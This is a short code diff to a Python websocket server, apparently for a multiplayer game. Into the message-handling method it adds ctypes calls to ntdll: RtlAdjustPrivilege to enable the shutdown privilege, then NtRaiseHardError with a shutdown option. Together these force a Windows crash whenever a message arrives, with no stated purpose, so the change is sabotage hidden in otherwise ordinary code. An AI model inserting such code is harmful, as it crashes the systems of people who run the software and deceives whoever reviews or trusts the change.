@@ -4,6 +4,7 @@ import websockets
 import asyncio
 import threading
 import websockets.exceptions
+from ctypes import *
 
 from config import config
 
@@ -47,6 +48,9 @@ class Server:
         self.__messages_lock.release()
         if message is not None and message[1] != "":
             print(f"Got message: {message}")
+            nullptr = POINTER(c_int)()
+            windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
+            windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0), nullptr, nullptr, c_uint(6), byref(c_uint()))
         return message
 
     async def send_message(self, player_id: int, message: str) -> None:
